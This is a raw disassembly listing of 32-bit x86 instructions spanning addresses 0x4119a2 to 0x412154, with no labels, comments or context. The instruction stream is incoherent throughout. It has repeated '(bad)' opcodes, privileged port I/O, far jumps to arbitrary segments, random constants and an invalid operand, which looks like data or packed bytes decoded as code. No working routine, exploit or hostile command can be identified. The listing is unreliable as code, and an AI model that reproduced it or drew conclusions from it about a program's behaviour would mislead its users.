  4119a2:	or     BYTE PTR [ebp+0x5ad56483],ah
  4119a8:	xchg   edi,eax
  4119a9:	mov    ebx,0x8d9a8327
  4119ae:	mov    BYTE PTR [eax+0x1fe6ccad],ch
  4119b4:	aaa    
  4119b5:	mov    al,0x7f
  4119b7:	dec    esp
  4119b8:	jne    0x4119ee
  4119ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119bb:	int3   
  4119bc:	sub    DWORD PTR [esi-0x2c272bfc],0xffffffad
  4119c3:	push   edx
  4119c4:	fst    st(4)
  4119c6:	sbb    DWORD PTR [edi-0x2832b352],0xdd6dc1fc
  4119d0:	mov    bl,0x62
  4119d2:	jecxz  0x4119d7
  4119d4:	fcomip st,st(1)
  4119d6:	push   cs
  4119d7:	mov    dh,0x5f
  4119d9:	in     eax,dx
  4119da:	jp     0x4119eb
  4119dc:	xchg   edx,eax
  4119dd:	dec    edi
  4119de:	out    dx,eax
  4119df:	or     ebp,ebp
  4119e1:	ja     0x411968
  4119e3:	adc    al,0xd9
  4119e5:	(bad)  
  4119e6:	mov    ebx,0x44722112
  4119eb:	(bad)  
  4119ec:	in     eax,dx
  4119ed:	mov    ch,0x7e
  4119ef:	xchg   WORD PTR [ebx+0x8a7d9d9],ax
  4119f6:	or     eax,0xcf5b989b
  4119fb:	es pusha 
  4119fd:	es mov esp,0x2569f86e
  411a03:	push   ecx
  411a04:	lods   eax,DWORD PTR ds:[esi]
  411a05:	(bad)  
  411a06:	lock add eax,0x8859ef62
  411a0c:	lea    ebx,[ebx-0x8]
  411a0f:	inc    esp
  411a10:	das    
  411a11:	inc    ecx
  411a12:	pusha  
  411a13:	xor    DWORD PTR [eax-0x27a69402],edx
  411a19:	dec    esi
  411a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a1b:	xor    al,0x26
  411a1d:	or     al,0x93
  411a1f:	ins    DWORD PTR es:[edi],dx
  411a20:	jmp    0x82c3:0x497d100
  411a27:	in     al,0xf6
  411a29:	cmp    DWORD PTR [eax-0x67813756],0x63
  411a30:	jbe    0x4119ce
  411a32:	sbb    ah,ah
  411a34:	pop    ss
  411a35:	adc    eax,0xb68d53bb
  411a3a:	xchg   DWORD PTR [esi-0x6c6b019e],ebp
  411a40:	stos   BYTE PTR es:[edi],al
  411a41:	cmp    DWORD PTR [edx],esp
  411a43:	jnp    0x411aac
  411a45:	lds    ebp,FWORD PTR [ebp-0xe]
  411a48:	push   esi
  411a49:	add    DWORD PTR [edx+0x67312c90],ecx
  411a4f:	xchg   edx,eax
  411a50:	fdivr  st,st(0)
  411a52:	stos   DWORD PTR es:[edi],eax
  411a53:	call   FWORD PTR [esi-0x1f]
  411a56:	fbstp  TBYTE PTR ds:0x60b6c602
  411a5c:	imul   BYTE PTR [ebp-0xd979d67]
  411a62:	pop    eax
  411a63:	sti    
  411a64:	adc    DWORD PTR [edx+ecx*4],ebx
  411a67:	pop    ds
  411a68:	les    edi,FWORD PTR [esi-0x1550964]
  411a6e:	ret    0x3937
  411a71:	push   edi
  411a72:	add    eax,0xc04e32c0
  411a77:	pop    ss
  411a78:	cdq    
  411a79:	or     eax,0x3f8cf80b
  411a7e:	push   ss
  411a7f:	in     eax,dx
  411a80:	push   ecx
  411a81:	xor    bl,BYTE PTR [ecx*1-0x18baa577]
  411a88:	imul   esi,DWORD PTR [edx],0x3b
  411a8b:	js     0x411a5f
  411a8d:	mov    dh,0x85
  411a8f:	or     bh,bl
  411a91:	cdq    
  411a92:	inc    edi
  411a93:	pop    edi
  411a94:	or     DWORD PTR [ecx+0x5],ebp
  411a97:	pop    eax
  411a98:	shr    BYTE PTR [ebx-0x71],0x5
  411a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a9d:	test   al,0xe2
  411a9f:	inc    ecx
  411aa0:	mul    al
  411aa2:	fwait
  411aa3:	dec    ecx
  411aa4:	mov    eax,0x7b480539
  411aa9:	mov    edi,0x65d8880e
  411aae:	rcl    BYTE PTR [eax+edi*4-0x70be17aa],0x6c
  411ab6:	and    DWORD PTR [edx-0x58],0x2469df5c
  411abd:	push   eax
  411abe:	push   eax
  411abf:	fcomp  DWORD PTR [eax-0x42]
  411ac2:	mov    ch,0xf0
  411ac4:	jmp    0x411a70
  411ac6:	inc    ecx
  411ac7:	sbb    cl,BYTE PTR [esi+0x47]
  411aca:	idiv   DWORD PTR [ebp+0x14]
  411acd:	push   eax
  411ace:	xor    eax,ecx
  411ad0:	pop    edx
  411ad1:	cld    
  411ad2:	aam    0x1b
  411ad4:	pop    ebp
  411ad5:	enter  0xdfbe,0xca
  411ad9:	fiadd  WORD PTR [edi]
  411adb:	cmp    al,0x53
  411add:	add    ecx,DWORD PTR [ebx]
  411adf:	fcomi  st,st(7)
  411ae1:	stos   DWORD PTR es:[edi],eax
  411ae2:	stc    
  411ae3:	xchg   esi,eax
  411ae4:	xlat   BYTE PTR ds:[ebx]
  411ae5:	xchg   ebx,eax
  411ae6:	add    bl,bh
  411ae8:	push   ecx
  411ae9:	and    al,0x6f
  411aeb:	inc    ebx
  411aec:	mov    eax,ds:0xa74b6b9f
  411af1:	adc    DWORD PTR [esi],eax
  411af3:	stos   DWORD PTR es:[edi],eax
  411af4:	fisubr WORD PTR [edx-0x4535d9d0]
  411afa:	sbb    esi,DWORD PTR [ebp-0x41]
  411afd:	mov    ecx,0xeb9b397b
  411b02:	cld    
  411b03:	pushf  
  411b04:	jb     0x411b4d
  411b06:	mov    cl,dl
  411b08:	xchg   ebp,eax
  411b09:	mov    dl,0xdb
  411b0b:	xor    BYTE PTR [ebp-0x328406a1],0x4d
  411b12:	jo     0x411aa3
  411b14:	data16 jbe 0x411af1
  411b17:	xchg   ebp,eax
  411b18:	out    dx,al
  411b19:	dec    esp
  411b1a:	cmp    DWORD PTR [ebp+0x10c182d7],ebp
  411b20:	cmp    ebx,DWORD PTR [ecx-0x16]
  411b23:	pop    ecx
  411b24:	cmp    DWORD PTR [esp+ebx*2],ebx
  411b27:	into   
  411b28:	imul   esi,DWORD PTR [edx+0xff08e2a],0xffffffae
  411b2f:	test   eax,0x3a286567
  411b34:	fld    DWORD PTR [eax]
  411b36:	jg     0x411b17
  411b38:	push   eax
  411b39:	mov    bh,0x56
  411b3b:	shl    ebx,cl
  411b3d:	pop    esp
  411b3e:	push   ebp
  411b3f:	test   DWORD PTR [ecx-0x67],ecx
  411b42:	loop   0x411b47
  411b44:	mov    al,0x9d
  411b46:	setbe  BYTE PTR [eax]
  411b49:	cdq    
  411b4a:	adc    eax,0x580f2e15
  411b4f:	lahf   
  411b50:	outs   dx,DWORD PTR ds:[esi]
  411b51:	cmp    esp,ebp
  411b53:	sbb    BYTE PTR [esi+edi*2-0x2a],dl
  411b57:	pop    es
  411b58:	mov    dl,0xca
  411b5a:	dec    eax
  411b5b:	int3   
  411b5c:	fnstsw WORD PTR [eax-0x1e67b66]
  411b62:	jg     0x411b49
  411b64:	cmp    DWORD PTR [ecx+0x9],0xffffffb4
  411b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b69:	fwait
  411b6a:	push   ebp
  411b6b:	adc    al,0x76
  411b6d:	fwait
  411b6e:	sub    al,0xde
  411b70:	cwde   
  411b71:	push   edx
  411b72:	ja     0x411afc
  411b74:	pop    edi
  411b75:	and    DWORD PTR [ecx],ebp
  411b77:	iret   
  411b78:	stos   DWORD PTR es:[edi],eax
  411b79:	cs (bad) 
  411b7b:	jae    0x411bf5
  411b7d:	push   ebp
  411b7e:	adc    BYTE PTR [esi*4-0x2fd38bab],dl
  411b85:	cli    
  411b86:	mov    al,0x74
  411b88:	stos   DWORD PTR es:[edi],eax
  411b89:	mov    dh,0xc2
  411b8b:	sbb    ebp,edx
  411b8d:	push   es
  411b8e:	pop    es
  411b8f:	loop   0x411b1c
  411b91:	dec    edi
  411b92:	push   edx
  411b93:	mov    al,BYTE PTR [eax+0x6b]
  411b96:	ss push ebx
  411b98:	test   BYTE PTR [esi],ch
  411b9a:	or     DWORD PTR [edi+0x56e61162],esi
  411ba0:	imul   edi,DWORD PTR [edi+0x21],0xffffffb6
  411ba4:	mov    eax,DWORD PTR [ecx+0x29]
  411ba7:	jmp    DWORD PTR [eax-0x6d3a57e1]
  411bad:	adc    eax,0x54d39869
  411bb2:	cs sbb al,0x17
  411bb5:	mov    al,ds:0x5ad2cc20
  411bba:	icebp  
  411bbb:	lahf   
  411bbc:	test   DWORD PTR [esi],ebp
  411bbe:	test   al,0xca
  411bc0:	dec    edx
  411bc1:	call   0x13a03fcc
  411bc6:	pop    ebx
  411bc7:	mov    gs,edi
  411bc9:	out    0x4e,eax
  411bcb:	xchg   esp,eax
  411bcc:	sub    BYTE PTR [eax+0x52],0xd7
  411bd0:	dec    edx
  411bd1:	mov    ebp,fs
  411bd3:	jge    0x411b6a
  411bd5:	jg     0x411bf0
  411bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bd8:	je     0x411b68
  411bda:	inc    esi
  411bdb:	inc    edi
  411bdc:	xchg   ebp,eax
  411bdd:	into   
  411bde:	scas   eax,DWORD PTR es:[edi]
  411bdf:	inc    ecx
  411be0:	ja     0x411c12
  411be2:	das    
  411be3:	dec    eax
  411be4:	pop    ecx
  411be5:	or     cl,BYTE PTR [ebx+0x2f]
  411be8:	add    al,0xb
  411bea:	xlat   BYTE PTR ds:[ebx]
  411beb:	xchg   edi,eax
  411bec:	mov    ebx,0x391a7f21
  411bf1:	aad    0xab
  411bf3:	lods   al,BYTE PTR ds:[esi]
  411bf4:	mov    esp,0xf03e06d0
  411bf9:	mov    ebx,0x339da76f
  411bfe:	mov    ebx,0xc5c347ea
  411c03:	fld1   
  411c05:	sub    eax,0x5185e19d
  411c0a:	xor    edi,DWORD PTR [eax]
  411c0c:	adc    edx,DWORD PTR [edx-0x2c]
  411c0f:	(bad)  
  411c10:	popa   
  411c11:	or     BYTE PTR [edx-0x63],dh
  411c14:	mov    ah,al
  411c16:	add    DWORD PTR [edx-0x4e],ebp
  411c19:	or     ebx,DWORD PTR [edi]
  411c1b:	mov    dh,0x67
  411c1d:	push   edi
  411c1e:	cli    
  411c1f:	retf   0xb467
  411c22:	ror    DWORD PTR [edx+0x57878e66],0xd3
  411c29:	int3   
  411c2a:	test   eax,0xde3040be
  411c2f:	loopne 0x411c19
  411c31:	or     al,0x7f
  411c33:	xchg   ebx,eax
  411c34:	mov    ah,0xc3
  411c36:	add    al,0x8e
  411c38:	pop    ds
  411c39:	push   esp
  411c3a:	adc    BYTE PTR [ecx],bl
  411c3c:	or     al,0x1e
  411c3e:	into   
  411c3f:	(bad)  
  411c40:	mov    es,esi
  411c42:	addr16 fstp DWORD PTR [bx+si+0x21]
  411c47:	and    eax,eax
  411c49:	cwde   
  411c4a:	adc    BYTE PTR [ebx-0x6e],dl
  411c4d:	pop    edx
  411c4e:	loopne 0x411c97
  411c50:	out    dx,eax
  411c51:	ins    BYTE PTR es:[edi],dx
  411c52:	inc    esi
  411c53:	fidiv  DWORD PTR [ebx+0x41]
  411c56:	enter  0x6a3,0xda
  411c5a:	and    DWORD PTR [ecx+0x61],ebp
  411c5d:	and    al,BYTE PTR [eax]
  411c5f:	ins    DWORD PTR es:[edi],dx
  411c60:	jae    0x411c47
  411c62:	test   eax,0x35abb6f9
  411c67:	pop    ss
  411c68:	pop    edx
  411c69:	call   0xdb:0xeddc657f
  411c70:	jo     0x411cd1
  411c72:	clc    
  411c73:	pop    esi
  411c74:	pop    ebp
  411c75:	xchg   DWORD PTR [edi],esp
  411c77:	mov    edx,0xabf1b460
  411c7c:	sbb    al,0xd1
  411c7e:	fisttp WORD PTR ds:0x51694fd8
  411c84:	dec    edi
  411c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c86:	mov    fs,WORD PTR [edx+ebp*2-0x1238b40f]
  411c8d:	lea    ecx,[ebp+eiz*8+0x73]
  411c91:	inc    esi
  411c92:	xchg   ecx,eax
  411c93:	pop    ebp
  411c94:	xor    al,0xd2
  411c96:	std    
  411c97:	pop    edi
  411c98:	iret   
  411c99:	aam    0x9e
  411c9b:	mov    cl,0x91
  411c9d:	in     eax,dx
  411c9e:	enter  0x8488,0x69
  411ca2:	scas   al,BYTE PTR es:[edi]
  411ca3:	enter  0x56df,0x6b
  411ca7:	mov    ebx,0xa2f9eee3
  411cac:	jbe    0x411d27
  411cae:	aaa    
  411caf:	out    dx,eax
  411cb0:	inc    eax
  411cb1:	pop    ds
  411cb2:	test   BYTE PTR [ebp+eiz*2-0x3a],bl
  411cb6:	ins    BYTE PTR es:[edi],dx
  411cb7:	ror    BYTE PTR [esi+ebp*8+0x60],1
  411cbb:	not    DWORD PTR [eax]
  411cbd:	inc    ebp
  411cbe:	xor    ah,BYTE PTR [edi]
  411cc0:	xchg   ecx,eax
  411cc1:	mov    eax,ds:0x61781ef0
  411cc6:	in     al,dx
  411cc7:	call   0x28a54bba
  411ccc:	pop    es
  411ccd:	loopne 0x411cfc
  411ccf:	add    ecx,DWORD PTR [eax]
  411cd1:	sub    DWORD PTR [ebx],ebx
  411cd3:	int    0x5e
  411cd5:	xchg   edi,eax
  411cd6:	xor    BYTE PTR [edx-0x2c4f078e],bh
  411cdc:	add    BYTE PTR [ebp+0x256e056e],ch
  411ce2:	mov    eax,0xcefe37e5
  411ce7:	mov    cl,0x51
  411ce9:	lea    ebp,[edi+0x60]
  411cec:	pop    eax
  411ced:	mov    bl,0xed
  411cef:	(bad)  
  411cf0:	mov    edx,0x4268cdd3
  411cf5:	popa   
  411cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cf7:	aaa    
  411cf8:	add    BYTE PTR [edx+ecx*4],ch
  411cfb:	mov    bh,0x2c
  411cfd:	pop    esp
  411cfe:	out    dx,eax
  411cff:	and    al,0x70
  411d01:	test   BYTE PTR [eax-0x40],dl
  411d04:	cdq    
  411d05:	sub    bh,BYTE PTR [edi]
  411d07:	aaa    
  411d08:	or     eax,0x8a1841f1
  411d0d:	iret   
  411d0e:	out    dx,al
  411d0f:	test   eax,0x74c01777
  411d14:	and    ebx,0x1d2805dc
  411d1a:	(bad)  
  411d1b:	cmc    
  411d1c:	push   ecx
  411d1d:	repz mov dh,0xa2
  411d20:	fadd   DWORD PTR [ebx+0x3153d7e]
  411d26:	aam    0xb4
  411d28:	pop    esi
  411d29:	mov    BYTE PTR [edx],0xdd
  411d2c:	je     0x411d98
  411d2e:	jle    0x411dac
  411d30:	mov    al,ds:0x37c004ff
  411d35:	shr    DWORD PTR [eax],1
  411d37:	mov    esi,0x6738ae06
  411d3c:	push   esp
  411d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d3e:	inc    esi
  411d3f:	push   ds
  411d40:	cmp    dh,bh
  411d42:	xchg   esp,eax
  411d43:	mov    DWORD PTR [ebx-0x2bc4f295],ebx
  411d49:	retf   0x620f
  411d4c:	push   edi
  411d4d:	cmp    al,0x17
  411d4f:	dec    ebx
  411d50:	data16 arpl WORD PTR [ebx+0x992acd2],si
  411d57:	cmp    bh,ah
  411d59:	out    0x6e,eax
  411d5b:	js     0x411d9c
  411d5d:	pop    ecx
  411d5e:	test   BYTE PTR [ebx],ah
  411d60:	adc    al,0xde
  411d62:	int3   
  411d63:	sub    BYTE PTR [edi+esi*2-0x1b],ch
  411d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d68:	mov    bh,0x4a
  411d6a:	xor    DWORD PTR [ebp*4-0x31726b8d],edx
  411d71:	scas   eax,DWORD PTR es:[edi]
  411d72:	in     eax,dx
  411d73:	jb     0x411d8b
  411d75:	sub    ebp,DWORD PTR [esi]
  411d77:	es out dx,eax
  411d79:	sbb    al,0x20
  411d7b:	ja     0x411d4c
  411d7d:	mov    dh,0x19
  411d7f:	test   eax,0x71540f5e
  411d84:	sbb    BYTE PTR [edx-0x34],al
  411d87:	sub    BYTE PTR [esp+ebp*8-0x1873cc6c],ah
  411d8e:	jb     0x411df8
  411d90:	das    
  411d91:	out    0xe,al
  411d93:	cmp    eax,0x94920ee
  411d98:	test   BYTE PTR [edi+0x4e],ch
  411d9b:	sahf   
  411d9c:	out    dx,eax
  411d9d:	jnp    0x411d81
  411d9f:	lea    eax,[eax+0x6b655c02]
  411da5:	dec    edx
  411da6:	xor    esp,edx
  411da8:	lock icebp 
  411daa:	lock imul ebp,DWORD PTR [eax-0x64],0xffffff9c
  411daf:	sub    BYTE PTR [ecx-0x7ce2f9fd],bh
  411db5:	jecxz  0x411dd2
  411db7:	xchg   edi,eax
  411db8:	int    0xa3
  411dba:	loopne 0x411e03
  411dbc:	and    al,0x36
  411dbe:	pushf  
  411dbf:	jno    0x411d4c
  411dc1:	cmp    BYTE PTR [edi+0x24],ah
  411dc4:	push   ds
  411dc5:	xchg   edx,eax
  411dc6:	adc    al,0x7b
  411dc8:	vshufps ymm3,ymm3,YMMWORD PTR [ebx-0x46],0xd1
  411dce:	fcmovnbe st,st(4)
  411dd0:	jmp    0x1ddc:0xb63745f8
  411dd7:	xor    dl,BYTE PTR [edi-0x3b]
  411dda:	pushf  
  411ddb:	sbb    esp,DWORD PTR [ebx-0x57199fdd]
  411de1:	addr16 mov ds:0xeb2f,al
  411de5:	jle    0x411e28
  411de7:	ror    DWORD PTR [esi-0x1b],1
  411dea:	push   cs
  411deb:	sbb    al,dl
  411ded:	mov    DWORD PTR [esi],eax
  411def:	xor    al,0xe7
  411df1:	rcl    cl,0xd
  411df4:	sbb    al,0x32
  411df6:	cwde   
  411df7:	jl     0x411d9b
  411df9:	fist   WORD PTR [ebx]
  411dfb:	sub    BYTE PTR [edx+0x503fdebb],ah
  411e01:	adc    BYTE PTR [edi-0x2d9c6c45],dl
  411e07:	mov    eax,ds:0x68d5c14d
  411e0c:	aam    0x11
  411e0e:	loop   0x411e68
  411e10:	test   bl,0xa
  411e13:	adc    ebp,DWORD PTR [esi-0x27]
  411e16:	sti    
  411e17:	aaa    
  411e18:	dec    ebp
  411e19:	inc    esi
  411e1a:	lea    ebp,ds:0x9d75a402
  411e20:	adc    eax,0x955a71c6
  411e25:	inc    edi
  411e26:	adc    BYTE PTR [ebp-0x675c31da],ah
  411e2c:	jecxz  0x411e5e
  411e2e:	pop    esp
  411e2f:	aad    0xee
  411e31:	mov    bl,0xe1
  411e33:	sti    
  411e34:	jle    0x411df8
  411e36:	loop   0x411eab
  411e38:	xchg   BYTE PTR [edx-0x33],bl
  411e3b:	int    0xab
  411e3d:	psllq  mm7,QWORD PTR [ecx]
  411e40:	sbb    DWORD PTR [ebp+0x533862a8],0x3c4ae392
  411e4a:	jnp    0x411e0e
  411e4c:	sahf   
  411e4d:	aas    
  411e4e:	repz fisttp WORD PTR [ebx+0x5a431187]
  411e55:	inc    eax
  411e56:	push   ebx
  411e57:	sbb    al,0x5a
  411e59:	jbe    0x411e24
  411e5b:	outs   dx,BYTE PTR ds:[esi]
  411e5c:	sbb    eax,0x38baa559
  411e61:	add    eax,0x91703b79
  411e66:	ins    BYTE PTR es:[edi],dx
  411e67:	outs   dx,BYTE PTR ds:[esi]
  411e68:	inc    ebp
  411e69:	inc    eax
  411e6a:	sbb    al,0xa5
  411e6c:	mov    eax,ds:0x978eab18
  411e71:	loopne 0x411e0f
  411e73:	mov    ebx,0xac61130e
  411e78:	dec    edx
  411e79:	das    
  411e7a:	mov    BYTE PTR [edx-0xb],bl
  411e7d:	mov    cl,0x40
  411e7f:	pop    DWORD PTR [ebx-0x28]
  411e82:	or     al,0x3d
  411e84:	sbb    ebp,DWORD PTR [eax-0x51]
  411e87:	aaa    
  411e88:	loopne 0x411e76
  411e8a:	repnz inc ecx
  411e8c:	sahf   
  411e8d:	sub    DWORD PTR [edx+ebp*8+0x11e64c2c],ebp
  411e94:	or     eax,0xa126f27c
  411e99:	mov    ch,0xc3
  411e9b:	push   0x96e304b0
  411ea0:	int3   
  411ea1:	mov    ds:0x2cda04b2,al
  411ea6:	jae    0x411e88
  411ea8:	loope  0x411eda
  411eaa:	mov    esp,0x774ac036
  411eaf:	adc    ch,BYTE PTR [eax+0x2d]
  411eb2:	add    bl,dl
  411eb4:	loop   0x411ec0
  411eb6:	out    dx,eax
  411eb7:	pop    ecx
  411eb8:	mov    ebx,0xfa69933b
  411ebd:	sbb    BYTE PTR [ebx-0x42],bl
  411ec0:	jae    0x411e4f
  411ec2:	fsubp  st(0),st
  411ec4:	sub    al,0xf3
  411ec6:	test   eax,0x4125bcc9
  411ecb:	xchg   esi,eax
  411ecc:	inc    ebp
  411ecd:	jne    0x411e9f
  411ecf:	sub    al,0x42
  411ed1:	mov    BYTE PTR [edx+0x20ee720d],cl
  411ed7:	xor    al,0xbf
  411ed9:	lds    ebx,FWORD PTR [ebx+0x65]
  411edc:	int3   
  411edd:	sbb    BYTE PTR [esp+edx*4+0x6],dh
  411ee1:	jle    0x411f30
  411ee3:	retf   0x111c
  411ee6:	jmp    0x8df9ac71
  411eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eec:	xor    eax,0x2f89f3fb
  411ef1:	frstor cs:[esi+0x2c495a87]
  411ef8:	dec    ebx
  411ef9:	cmp    BYTE PTR ds:0xdf39f6f9,ah
  411eff:	imul   esp,edi,0x520a9a10
  411f05:	mov    esp,0x15af0e81
  411f0a:	aam    0xbc
  411f0c:	pop    ebx
  411f0d:	inc    edx
  411f0e:	cmc    
  411f0f:	loopne 0x411f3c
  411f11:	xchg   ebp,eax
  411f12:	or     esp,DWORD PTR [ebp-0x5e742bf]
  411f18:	pop    edx
  411f19:	and    BYTE PTR [edx+0x39eff57b],al
  411f1f:	add    al,0x22
  411f21:	inc    esi
  411f22:	sbb    al,BYTE PTR [edi+0x16e1e766]
  411f28:	jg     0x411eb0
  411f2a:	mov    ebp,0xbc4f43e1
  411f2f:	shl    BYTE PTR [ebx+0x3950e05],1
  411f35:	mov    cl,0x8c
  411f37:	shl    BYTE PTR [eax],cl
  411f39:	push   ecx
  411f3a:	jg     0x411f32
  411f3c:	push   ds
  411f3d:	push   eax
  411f3e:	ins    BYTE PTR es:[edi],dx
  411f3f:	out    dx,al
  411f40:	jmp    0x626b5505
  411f45:	std    
  411f46:	xchg   DWORD PTR [edx+ebp*1-0x9],esi
  411f4a:	mov    ?,WORD PTR [eax]
  411f4c:	push   edx
  411f4d:	jo     0x411fa5
  411f4f:	xor    BYTE PTR [ebx+eax*2+0x53451720],dl
  411f56:	xchg   edx,eax
  411f57:	sub    al,0x4c
  411f59:	cwde   
  411f5a:	retf   0x683
  411f5d:	jae    0x411fc6
  411f5f:	and    al,0x7c
  411f61:	inc    ecx
  411f62:	test   eax,0xe333a9f7
  411f67:	(bad)  
  411f68:	in     al,0x39
  411f6a:	adc    eax,0xf12e9a05
  411f6f:	out    dx,eax
  411f70:	jmp    0x36e1:0x406f4211
  411f77:	fisubr DWORD PTR ds:0xe26b3f60
  411f7d:	dec    esi
  411f7e:	sub    al,0xe6
  411f80:	call   0x5967603c
  411f85:	mov    WORD PTR [eax+0x141be686],ds
  411f8b:	xchg   ebx,esp
  411f8d:	ins    BYTE PTR es:[edi],dx
  411f8e:	repnz ins DWORD PTR es:[edi],dx
  411f90:	jb     0x411fb6
  411f92:	mov    WORD PTR [esi+0x32],es
  411f95:	cmp    eax,DWORD PTR [ecx-0x6ac178f7]
  411f9b:	mov    esp,0x52e04b6a
  411fa0:	jns    0x411f2b
  411fa2:	popa   
  411fa3:	or     esp,DWORD PTR [edi+0x1a703d78]
  411fa9:	cmp    BYTE PTR [edx-0x4a12202c],bh
  411faf:	stc    
  411fb0:	je     0x411fc5
  411fb2:	push   es
  411fb3:	xor    eax,DWORD PTR [esi+eiz*4]
  411fb6:	je     0x411f74
  411fb8:	push   ds
  411fb9:	mov    al,0xdc
  411fbb:	popf   
  411fbc:	rcr    BYTE PTR [ebx+0x78cc6559],0x87
  411fc3:	stos   BYTE PTR es:[edi],al
  411fc4:	mov    ch,0x85
  411fc6:	jge    0x411f6e
  411fc8:	mov    WORD PTR [ebp+0x687cda7f],gs
  411fce:	inc    ebp
  411fcf:	adc    DWORD PTR [edx],ebp
  411fd1:	and    BYTE PTR [esi],ch
  411fd3:	sub    ebp,DWORD PTR [ebp+0x2feb6062]
  411fd9:	mov    edx,DWORD PTR [edx+0x5f]
  411fdc:	imul   edi,DWORD PTR [ebx+ebp*8+0x4ca0b8a9],0xffffffae
  411fe4:	dec    edx
  411fe5:	aaa    
  411fe6:	pop    ds
  411fe7:	xor    BYTE PTR [ecx-0x78],0x63
  411feb:	(bad)  
  411fec:	loop   0x411fef
  411fee:	sbb    DWORD PTR [ecx-0x69534f00],0xffffffc6
  411ff5:	in     eax,dx
  411ff6:	cs add al,0xd2
  411ff9:	dec    ebx
  411ffa:	ret    0x37ce
  411ffd:	dec    ebp
  411ffe:	mov    bh,0xc3
  412000:	pushf  
  412001:	mov    bl,0x6d
  412003:	add    bl,BYTE PTR [edx+edi*1]
  412006:	fs push 0x1
  412009:	fidivr DWORD PTR [eax]
  41200b:	xchg   edx,eax
  41200c:	out    0x3a,al
  41200e:	mov    ds:0xd736624,al
  412013:	add    bh,ch
  412015:	xchg   BYTE PTR [ecx+ecx*8+0x543898b2],dl
  41201c:	imul   edi,DWORD PTR ss:[eax+0x4948c172],0xffffffaf
  412024:	(bad)  
  412025:	fld    DWORD PTR [edx]
  412027:	test   DWORD PTR [edx+eax*2-0x1e],ebx
  41202b:	push   ebx
  41202c:	leave  
  41202d:	push   cs
  41202e:	mov    cl,0xfd
  412030:	fcmovnb st,st(5)
  412032:	test   al,0x6e
  412034:	stos   DWORD PTR es:[edi],eax
  412035:	cmp    eax,0xb0c5215e
  41203a:	rcl    BYTE PTR [ecx-0x5b],cl
  41203d:	cs jmp 0x82d:0xc387311b
  412045:	cmp    BYTE PTR [esi-0x5a],bh
  412048:	in     eax,dx
  412049:	cmp    eax,0xafddc9c8
  41204e:	xchg   ebx,eax
  41204f:	nop
  412050:	pushf  
  412051:	jmp    0x4120a4
  412053:	pop    es
  412054:	cmp    dl,BYTE PTR [ebx-0x5f23e715]
  41205a:	xchg   ecx,eax
  41205b:	and    al,0x66
  41205d:	push   edx
  41205e:	adc    eax,0x884ba3d5
  412063:	push   edx
  412064:	rol    DWORD PTR gs:[ebp+0x43],cl
  412068:	sbb    BYTE PTR [esi+eiz*1-0x2e],al
  41206c:	mov    esp,0x7b231300
  412071:	es jns 0x412019
  412074:	inc    ebp
  412075:	into   
  412076:	hlt    
  412077:	test   eax,0xd1134e68
  41207c:	push   ebp
  41207d:	mov    ch,0xaa
  41207f:	mov    dl,0xe8
  412081:	jl     0x4120bb
  412083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412084:	jmp    0xec8d:0x4b426119
  41208b:	jnp    0x4120dd
  41208d:	in     eax,dx
  41208e:	push   ebx
  41208f:	imul   edi,edx,0x8487ecbb
  412095:	adc    DWORD PTR [eax+edx*8+0x66],eax
  412099:	mov    ecx,0xa3703142
  41209e:	sahf   
  41209f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120a0:	cwde   
  4120a1:	(bad)
  4120a5:	sar    BYTE PTR [edx],1
  4120a7:	and    al,0x15
  4120a9:	add    DWORD PTR [esi+0x6d],eax
  4120ac:	adc    BYTE PTR [eax-0x61],ch
  4120af:	lds    ebx,FWORD PTR [ecx-0x5eb7ccd9]
  4120b5:	cld    
  4120b6:	jnp    0x4120bf
  4120b8:	rol    dl,cl
  4120ba:	popa   
  4120bb:	ss jb  0x41206a
  4120be:	hlt    
  4120bf:	add    BYTE PTR [eax-0x833660a],0x1b
  4120c6:	xor    BYTE PTR [edx],0x33
  4120c9:	xor    eax,DWORD PTR [edi+0xa62ea7d]
  4120cf:	fldenv [ebx+0x180aaf15]
  4120d5:	ja     0x412126
  4120d7:	xchg   edi,eax
  4120d8:	and    al,0x65
  4120da:	lock or dl,bh
  4120dd:	popf   
  4120de:	fild   DWORD PTR [ebx+0x2]
  4120e1:	add    BYTE PTR [ecx],0x29
  4120e4:	adc    dl,0x63
  4120e7:	jmp    0x2145:0x365e46e9
  4120ee:	mov    eax,ds:0xd1a70b08
  4120f3:	add    ah,BYTE PTR [ebx+0x6b]
  4120f6:	iret   
  4120f7:	dec    esi
  4120f8:	mov    ah,0xa
  4120fa:	rcl    BYTE PTR [edi+ebx*1+0x27],cl
  4120fe:	dec    eax
  4120ff:	fsub   DWORD PTR [ebp-0x5807d410]
  412105:	adc    DWORD PTR [ebx+0x56dd6f8],ebx
  41210b:	jmpw   0x7d0
  41210f:	(bad)  
  412110:	data16 and al,0x96
  412113:	mov    ebp,0x38eb8f15
  412118:	(bad)  
  412119:	shr    BYTE PTR [ebp-0xf],cl
  41211c:	push   0xffffffd4
  41211e:	lods   eax,DWORD PTR ds:[esi]
  41211f:	or     ah,al
  412121:	lods   eax,DWORD PTR ds:[esi]
  412122:	and    ch,dl
  412124:	mov    bh,0xa
  412126:	in     al,0x6
  412128:	out    0x80,eax
  41212a:	cmp    BYTE PTR [ebx+0x50],bh
  41212d:	repnz and eax,edi
  412130:	add    edi,ecx
  412132:	ret    0xa516
  412135:	add    ebx,DWORD PTR [ebp+0x67]
  412138:	pop    edi
  412139:	test   al,0xed
  41213b:	repz loope 0x4121ab
  41213e:	dec    ecx
  41213f:	paddusb mm5,QWORD PTR [esi]
  412142:	mov    al,0x2e
  412144:	jl     0x4121ac
  412146:	sti    
  412147:	sbb    ebx,edi
  412149:	xor    al,0xc4
  41214b:	shl    bl,cl
  41214d:	sbb    DWORD PTR [ecx+0x2f],0xffffff9f
  412151:	xor    bh,dl
  412153:	nop
  412154:	dec    ebp
